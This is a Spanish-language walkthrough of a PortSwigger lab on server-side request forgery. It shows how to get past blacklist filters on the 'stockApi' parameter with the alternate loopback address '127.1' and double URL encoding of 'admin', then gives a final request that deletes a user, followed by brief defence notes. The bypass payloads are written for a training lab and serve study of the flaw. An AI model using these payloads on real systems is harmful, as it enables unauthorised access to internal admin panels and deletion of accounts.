# SSRF - Filtro de entrada basado en blacklist (PortSwigger Lab)

Lab: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

## Objetivo del lab
Usar la funcionalidad "Check stock" para forzar al servidor a pedir recursos internos:
- Acceder a `http://localhost/admin`
- Borrar el usuario `carlos`

## Idea clave
El endpoint de stock (`POST /product/stock`) recibe un parámetro tipo URL (`stockApi=`) que el servidor fetchea.
El lab intenta frenar SSRF con **blacklists débiles**:
- Bloqueo de loopback (`127.0.0.1` / `localhost`) por coincidencia de string.
- Bloqueo de la ruta `admin` por coincidencia de string.

La explotación consiste en:
1. Bypassear el filtro de loopback usando una representación alternativa de `127.0.0.1`.
2. Bypassear el filtro de `admin` ofuscando el string con URL-encoding (doble encoding).

## Dónde mirar
- UI: cualquier producto -> "Check stock"
- Request: `POST /product/stock`
- Param vulnerable: `stockApi`

## Cómo resolverlo (pasos en Burp)
1. En un producto, click "Check stock".
2. Intercepta la request y mandala a Repeater.
3. Proba loopback directo:
   - `stockApi=http://127.0.0.1/`
   - Debería quedar bloqueado (defensa 1).
4. Bypass loopback:
   - `stockApi=http://127.1/`
   - `127.1` suele resolverse como `127.0.0.1`.
5. Intentar admin:
   - `stockApi=http://127.1/admin`
   - Debería quedar bloqueado (defensa 2).
6. Bypass `admin` con doble URL encoding de la `a`:
   - `admin` -> `%2561dmin` (donde `%61` es `a`, y `%25` es el `%`)
   - Probar: `stockApi=http://127.1/%2561dmin`
7. Ejecutar la acción final:
   - `stockApi=http://127.1/%2561dmin/delete?username=carlos`

## Payload final (request mínima)
```http
POST /product/stock HTTP/2
Host: TARGET_HOST
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/%2561dmin/delete?username=carlos
```

Nota: dependiendo de cómo Burp/tu editor haga encoding, podés ver la variante equivalente:
- `%2561` == `%25%36%31` (representan el mismo doble-encoding de `a`)

## Notas de defensa (para recordar)
- Evitar blacklists: usar allowlists de destinos/hosts y rutas permitidas.
- Parsear/normalizar URLs de forma consistente (antes de validar y antes de usar).
- Bloquear acceso a redes internas después de resolver DNS (y controlar redirects).
- Egress filtering / segmentación: el servidor no debería poder hablar con `localhost`/metadata/admin panels.
